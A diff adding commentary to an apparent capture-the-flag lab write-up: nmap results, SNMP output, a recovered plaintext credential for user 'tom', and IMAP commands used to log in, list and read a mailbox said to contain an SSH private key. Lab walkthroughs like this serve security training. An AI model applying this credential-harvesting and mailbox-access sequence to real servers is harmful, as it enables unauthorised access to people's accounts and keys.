@@ -76,6 +76,7 @@ PORT    STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 22.11 seconds
  ```
 
+Unauthenticated access does not work
 
 ```
 telnet 10.129.202.20 110                         
@@ -239,6 +240,10 @@ iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = No more variables left in t
                    
 ```
 
+creds recovered tom:NMds732Js2761
+
+the creds are valid for the IMAP server
+
 ```
 telnet 10.129.202.20 143             
 Trying 10.129.202.20...
@@ -253,6 +258,8 @@ LOGIN BAD First parameter in line is IMAP's command tag, not the command name. A
 
 ```
 
+Enumeration reveals tom inbox
+
 ```
 LITERAL+ NOTIFY SPECIAL-USE] Logged in
 1a LIST "" *
@@ -264,6 +271,8 @@ LITERAL+ NOTIFY SPECIAL-USE] Logged in
 
 
 ```
+
+Selecting the inbox:
 
 ```
 1a SELECT INBOX
@@ -277,6 +286,8 @@ LITERAL+ NOTIFY SPECIAL-USE] Logged in
 1a OK [READ-WRITE] Select completed (0.001 + 0.000 secs).
 
 ```
+
+Reading the inbox reveals his private key for the ssh server:
 
 ```
 1a FETCH 1 BODY[]
